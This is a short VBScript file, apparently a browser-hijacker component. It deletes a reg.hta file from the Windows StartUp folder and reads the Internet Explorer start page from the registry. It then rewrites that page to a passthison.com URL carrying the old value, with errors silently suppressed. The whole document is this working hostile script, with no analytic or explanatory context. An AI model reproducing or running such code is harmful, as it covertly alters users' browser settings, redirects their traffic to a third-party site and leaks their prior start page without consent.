On Error Resume Next
set wscr=CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
filename="c:\Windows\Start Menu\Programs\StartUp\reg.hta"
if (fso.FileExists(filename)) Then
fso.DeleteFile(filename)
End If
rr=wscr.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
If InStr(LCase(rr),"passthison.com")=0 Then
ss="http://www.passthison.com/r3/?" + rr
aa=wscr.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",ss)
End If